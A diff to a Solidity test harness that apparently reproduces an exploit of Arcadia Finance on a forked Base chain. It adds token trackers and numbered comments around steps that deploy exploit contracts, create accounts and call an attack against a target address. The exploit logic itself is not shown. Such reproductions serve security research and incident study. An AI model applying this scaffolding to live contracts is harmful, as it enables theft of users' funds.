@@ -19,23 +19,30 @@ contract Exploit_ArcadiaFinance is TestHarness, TokenBalanceTracker {
     IERC20 internal constant cbBTC =
         IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
 
+    IERC20 internal constant USDS =
+        IERC20(0x820C137fa70C8691f0e44Dc420a5e53c168921Dc);
+
+    IERC20 internal constant AERO =
+        IERC20(0x940181a94A35A4569E4529A3CDfB74e38FD98631);
+
     function setUp() external {
         cheat.createSelectFork("base", 32881440);
 
         addTokenToTracker(address(WETH));
         addTokenToTracker(address(USDC));
         addTokenToTracker(address(cbBTC));
+        addTokenToTracker(address(USDS));
+        addTokenToTracker(address(AERO));
 
         updateBalanceTracker(address(this));
     }
 
     function test_attack() external {
-        
-        
-        // Deploy the exploit hook contract
+
+        // 1. Deploy the exploit hook contract
         ExploitHook exploitHook = new ExploitHook();
 
-        // Deploy the exploit contract 1
+        // 2. Deploy the exploit contract 1
         Exploit1 exploit1 = new Exploit1();
         
         updateBalanceTracker(address(exploit1));
@@ -45,8 +52,10 @@ contract Exploit_ArcadiaFinance is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel("Attacker Contract", address(exploit1));
 
 
+        // 3. Create accounts
         exploit1.createAccounts(15, 0xDa14Fdd72345c4d2511357214c5B89A919768e59);
 
+        // 4. Execute the attack
         exploit1.attack(
             Exploit1.Data(
                 0x9529E5988ceD568898566782e88012cf11C3Ec99, // targetContract
